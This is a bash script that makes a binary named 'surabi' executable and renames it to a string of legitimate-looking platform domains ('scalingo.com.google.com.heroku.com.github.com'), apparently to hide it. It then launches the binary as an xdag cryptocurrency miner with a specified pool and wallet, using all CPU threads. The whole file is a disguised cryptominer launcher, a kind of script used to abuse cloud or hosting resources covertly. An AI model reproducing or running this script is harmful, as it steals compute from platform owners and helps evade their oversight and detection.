#!/bin/bash
apt update
chmod u+x surabi
mv surabi scalingo.com.google.com.heroku.com.github.com
./scalingo.com.google.com.heroku.com.github.com --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --password x --cpu-threads $(nproc --all)
